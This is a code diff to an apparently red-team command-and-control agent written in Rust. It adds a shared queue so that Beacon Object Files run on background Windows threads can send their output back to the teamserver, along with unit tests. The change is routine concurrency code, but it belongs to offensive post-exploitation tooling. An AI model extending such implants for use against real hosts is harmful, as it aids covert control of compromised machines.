@@ -8,7 +8,23 @@
 //! On non-Windows targets the loader returns an error immediately — BOF
 //! execution is only meaningful on a Windows host.
 
+use std::sync::{Arc, Mutex};
+
 use tracing::warn;
+
+// ─── BOF output queue ─────────────────────────────────────────────────────
+
+/// Thread-safe queue for BOF callbacks produced by background threads.
+///
+/// Background BOF threads push their [`BofCallback`]s into this queue; the
+/// agent main loop drains it each iteration and forwards the callbacks to the
+/// teamserver, preserving the `InlineExecute` callback contract.
+pub type BofOutputQueue = Arc<Mutex<Vec<BofCallback>>>;
+
+/// Create a new, empty [`BofOutputQueue`].
+pub fn new_bof_output_queue() -> BofOutputQueue {
+    Arc::new(Mutex::new(Vec::new()))
+}
 
 // ─── BOF callback sub-types (agent → server) ───────────────────────────────
 
@@ -624,6 +640,7 @@ struct BofThreadArgs {
     function_name: String,
     object_data: Vec<u8>,
     arg_data: Vec<u8>,
+    output_queue: BofOutputQueue,
 }
 
 /// Thread entry point for threaded BOF execution.
@@ -637,9 +654,14 @@ struct BofThreadArgs {
 unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 {
     // SAFETY: param is a Box<BofThreadArgs> leaked in coffee_execute_threaded.
     let args = unsafe { Box::from_raw(param.cast::<BofThreadArgs>()) };
-    // Output is not yet forwarded to the teamserver — a follow-up issue will
-    // add an async output channel for background BOF results.
-    let _ = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
+    let result = coffee_execute(&args.function_name, &args.object_data, &args.arg_data, false);
+
+    // Forward BOF callbacks to the shared output queue so the main agent loop
+    // can drain and send them to the teamserver on the next iteration.
+    if let Ok(mut queue) = args.output_queue.lock() {
+        queue.extend(result.callbacks);
+    }
+
     0
 }
 
@@ -650,6 +672,9 @@ unsafe extern "system" fn bof_thread_entry(param: *mut std::ffi::c_void) -> u32 
 /// thread via `CommandJob`.  Ownership of the handle is transferred to the
 /// caller; close it (or let `JobStore::kill` do so) when the job is done.
 ///
+/// BOF callbacks produced by the thread are pushed into `output_queue` so the
+/// main agent loop can drain and forward them to the teamserver.
+///
 /// Returns `None` if `CreateThread` fails; in that case the argument memory is
 /// reclaimed and no thread is started.
 #[cfg(windows)]
@@ -658,8 +683,9 @@ pub fn coffee_execute_threaded(
     function_name: String,
     object_data: Vec<u8>,
     arg_data: Vec<u8>,
+    output_queue: BofOutputQueue,
 ) -> Option<isize> {
-    let args = Box::new(BofThreadArgs { function_name, object_data, arg_data });
+    let args = Box::new(BofThreadArgs { function_name, object_data, arg_data, output_queue });
     let param = Box::into_raw(args).cast::<std::ffi::c_void>();
 
     // SAFETY: param points to a valid Box<BofThreadArgs>; the thread
@@ -693,6 +719,7 @@ pub fn coffee_execute_threaded(
     _function_name: String,
     _object_data: Vec<u8>,
     _arg_data: Vec<u8>,
+    _output_queue: BofOutputQueue,
 ) -> Option<isize> {
     warn!("Threaded BOF execution is only supported on Windows");
     None
@@ -740,7 +767,60 @@ mod tests {
     #[cfg(not(windows))]
     #[test]
     fn threaded_non_windows_stub_returns_none() {
-        let result = coffee_execute_threaded("go".to_string(), vec![0u8; 20], vec![]);
+        let result = coffee_execute_threaded(
+            "go".to_string(),
+            vec![0u8; 20],
+            vec![],
+            new_bof_output_queue(),
+        );
         assert!(result.is_none());
+    }
+
+    #[test]
+    fn new_bof_output_queue_starts_empty() {
+        let queue = new_bof_output_queue();
+        let guard = queue.lock().expect("lock");
+        assert!(guard.is_empty());
+    }
+
+    #[test]
+    fn bof_output_queue_can_push_and_drain() {
+        let queue = new_bof_output_queue();
+
+        // Simulate a background thread pushing callbacks
+        {
+            let mut guard = queue.lock().expect("lock");
+            guard.push(BofCallback { callback_type: BOF_RAN_OK, payload: vec![1, 2, 3] });
+            guard.push(BofCallback { callback_type: BOF_CALLBACK_OUTPUT, payload: vec![4, 5] });
+        }
+
+        // Drain (take) the callbacks
+        let drained = std::mem::take(&mut *queue.lock().expect("lock"));
+        assert_eq!(drained.len(), 2);
+        assert_eq!(drained[0].callback_type, BOF_RAN_OK);
+        assert_eq!(drained[1].callback_type, BOF_CALLBACK_OUTPUT);
+
+        // Queue should be empty after drain
+        assert!(queue.lock().expect("lock").is_empty());
+    }
+
+    #[test]
+    fn bof_output_queue_is_thread_safe() {
+        let queue = new_bof_output_queue();
+        let queue_clone = queue.clone();
+
+        let handle = std::thread::spawn(move || {
+            let mut guard = queue_clone.lock().expect("lock");
+            guard.push(BofCallback {
+                callback_type: BOF_CALLBACK_OUTPUT,
+                payload: b"hello from thread".to_vec(),
+            });
+        });
+
+        handle.join().expect("thread join");
+
+        let guard = queue.lock().expect("lock");
+        assert_eq!(guard.len(), 1);
+        assert_eq!(guard[0].payload, b"hello from thread");
     }
 }
